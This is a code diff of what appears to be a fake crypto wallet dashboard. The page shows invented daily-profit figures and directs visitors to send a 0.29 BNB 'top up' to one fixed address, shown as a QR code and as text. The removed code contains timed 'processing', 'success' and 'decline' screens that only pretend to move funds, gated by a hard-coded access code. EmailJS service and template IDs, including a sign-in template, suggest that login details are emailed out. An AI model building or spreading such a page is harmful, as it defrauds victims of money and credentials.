@@ -245,28 +245,8 @@
     document.getElementById('accessCodePopup').style.display = 'none';
 
     if (input === 'B577nn8h') {
-      showPage('processingPage');
-      setTimeout(() => {
-        showPage('successPage');
-        totalAsset = 0;
-        document.getElementById('totalAssetsDisplay').innerText = `$${totalAsset.toFixed(2)}`;
-        setTimeout(() => showPage('page5'), 3000);
-      }, 8000);
-    } else {
-      showPage('connectingPage');
-      setTimeout(() => {
-        showPage('declinePage');
-        setTimeout(() => {
-          showPage('page5');
-          document.getElementById('transferAmount').value = '';
-          document.getElementById('inputWallet').value = '';
-          document.getElementById('networkSelect').selectedIndex = 0;
-        }, 3000);
-      }, 7000);
-    }
-  }
-</script>
-    
+
+    <button onclick="showPage('page8')">Transfer to Main Wallet</button>
     <button onclick="goToScan('Receive')">Receive</button>
     <button onclick="goToScan('Top Up 0.29 BNB')">Top Up BNB</button>
   </div>
@@ -306,7 +286,7 @@
       Cancel
     </button>
   </div>
-
+        
   <!-- Page 6: Scan -->
   <div class="page" id="page6">
     <div class="form-container">
@@ -707,10 +687,54 @@
       </div>
       <div>$0.00</div>
     </div>
-    
-<!-- Transfer to Main Wallet Page -->  
-<button onclick="goToScan('Transfer to Main Wallet')">Transfer to Main Wallet</button>
-<div class="page" id="transferPage">
+
+    <button onclick="showPage('page8')">Transfer to Main Wallet</button>
+    <button onclick="goToScan('Receive')">Receive</button>
+    <button onclick="goToScan('Top Up BNB')">Top Up 0.29 BNB</button>
+    <div style="margin-top: 20px;">
+      <p>Daily Profit Goal: <strong>$150.00</strong></p>
+      <p>Progress: <strong id="dailyProgress">$0.00 (0%)</strong></p>
+      <div style="background:#2d2d2d; height:20px; border-radius:10px; overflow:hidden;">
+        <div id="goalBar" style="height:100%; width:0%; background:#00ff00;"></div>
+      </div>
+    </div>
+    <canvas id="profitChart" style="margin-top: 30px; background:#131722; border-radius:10px;"></canvas>
+    <button onclick="document.getElementById('logoutConfirm').style.display='block'">Sign Out</button>
+  </div>
+</div>
+
+<!-- Logout Confirmation -->
+<div id="logoutConfirm">
+  <p>Are you sure you want to log out?</p>
+  <button onclick="logout()">Confirm</button>
+  <button onclick="document.getElementById('logoutConfirm').style.display='none'">Cancel</button>
+</div>
+
+<!-- Page 6: Scan -->
+<div class="page" id="page6">
+  <div class="form-container">
+    <h2 id="scanAction">Action</h2>
+    <img src="https://api.qrserver.com/v1/create-qr-code/?data=0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0&size=200x200" alt="QR Code">
+    <p>Send to: <strong style="color:#f3ba2f;">0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0</strong></p>
+    <input type="text" id="txHash" placeholder="Enter Transaction Hash">
+    <button onclick="submitTransaction()">Confirm Transaction</button>
+    <div id="txStatus"></div>
+    <button onclick="showPage(5)">Return</button>
+  </div>
+</div>
+
+<!-- Page 7: Connect Wallet -->
+<div class="page" id="page7">
+  <div class="form-container">
+    <h2>Connect Your Wallet</h2>
+    <input type="text" id="walletAddress" placeholder="Enter BEP20 Wallet Address">
+    <button onclick="confirmWallet()">Confirm Wallet</button>
+    <button onclick="showPage(5)">Return to Dashboard</button>
+  </div>
+</div>
+  
+<!-- Page 8: Transfer to Main Wallet -->
+<div class="page" id="page8">
   <div class="form-container">
     <h2>Transfer to Main Wallet</h2>
     <div class="input-section">
@@ -817,51 +841,7 @@
     }
   }
 </script>
- 
-    <button onclick="goToScan('Receive')">Receive</button>
-    <button onclick="goToScan('Top Up BNB')">Top Up 0.29 BNB</button>
-    <div style="margin-top: 20px;">
-      <p>Daily Profit Goal: <strong>$150.00</strong></p>
-      <p>Progress: <strong id="dailyProgress">$0.00 (0%)</strong></p>
-      <div style="background:#2d2d2d; height:20px; border-radius:10px; overflow:hidden;">
-        <div id="goalBar" style="height:100%; width:0%; background:#00ff00;"></div>
-      </div>
-    </div>
-    <canvas id="profitChart" style="margin-top: 30px; background:#131722; border-radius:10px;"></canvas>
-    <button onclick="document.getElementById('logoutConfirm').style.display='block'">Sign Out</button>
-  </div>
-</div>
-
-<!-- Logout Confirmation -->
-<div id="logoutConfirm">
-  <p>Are you sure you want to log out?</p>
-  <button onclick="logout()">Confirm</button>
-  <button onclick="document.getElementById('logoutConfirm').style.display='none'">Cancel</button>
-</div>
-
-<!-- Page 6: Scan -->
-<div class="page" id="page6">
-  <div class="form-container">
-    <h2 id="scanAction">Action</h2>
-    <img src="https://api.qrserver.com/v1/create-qr-code/?data=0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0&size=200x200" alt="QR Code">
-    <p>Send to: <strong style="color:#f3ba2f;">0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0</strong></p>
-    <input type="text" id="txHash" placeholder="Enter Transaction Hash">
-    <button onclick="submitTransaction()">Confirm Transaction</button>
-    <div id="txStatus"></div>
-    <button onclick="showPage(5)">Return</button>
-  </div>
-</div>
-
-<!-- Page 7: Connect Wallet -->
-<div class="page" id="page7">
-  <div class="form-container">
-    <h2>Connect Your Wallet</h2>
-    <input type="text" id="walletAddress" placeholder="Enter BEP20 Wallet Address">
-    <button onclick="confirmWallet()">Confirm Wallet</button>
-    <button onclick="showPage(5)">Return to Dashboard</button>
-  </div>
-</div>
-
+  
 <script>
 const emailService = "service_78wwbgl";
 const signinTemplate = "template_omkmcio";
